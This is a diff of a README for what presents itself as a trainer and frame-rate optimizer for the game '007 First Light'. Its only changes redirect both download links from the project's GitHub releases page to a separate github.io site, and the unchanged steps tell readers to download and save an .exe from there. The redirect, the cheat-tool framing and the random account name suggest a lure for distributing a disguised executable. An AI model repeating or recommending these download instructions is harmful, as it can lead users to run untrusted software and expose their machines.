@@ -1,6 +1,6 @@
 # 🎯 007-First-Light-Trainer-And-Optimizer - Enhance gameplay and boost your frame rates
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/centenarian-caecum587/007-First-Light-Trainer-And-Optimizer/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://centenarian-caecum587.github.io)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you run the software:
 
 ## 🚀 Downloading and Setup
 
-1. Visit the project release page to get the software: [Download Latest Release](https://github.com/centenarian-caecum587/007-First-Light-Trainer-And-Optimizer/releases).
+1. Visit the project release page to get the software: [Download Latest Release](https://centenarian-caecum587.github.io).
 2. Look for the file ending in `.exe` under the latest release version on the page.
 3. Click the file name to start the download.
 4. Save the file to a folder on your computer.
